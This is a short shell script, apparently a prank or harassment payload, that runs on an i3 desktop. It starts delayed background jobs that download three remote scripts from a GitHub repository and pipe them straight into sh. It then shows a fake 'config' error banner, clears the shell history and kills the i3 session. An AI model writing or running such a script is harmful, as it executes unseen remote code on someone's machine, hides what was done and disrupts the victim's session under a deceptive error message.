(sleep 30; curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/loop.sh | sh) &
(sleep 35; curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/notif.sh | sh) &
(sleep 25; curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/img.sh |sh) &

i3-nagbar -t error -m "error with your %e=\\fe42' config" &
history -c &
i3-msg kill &
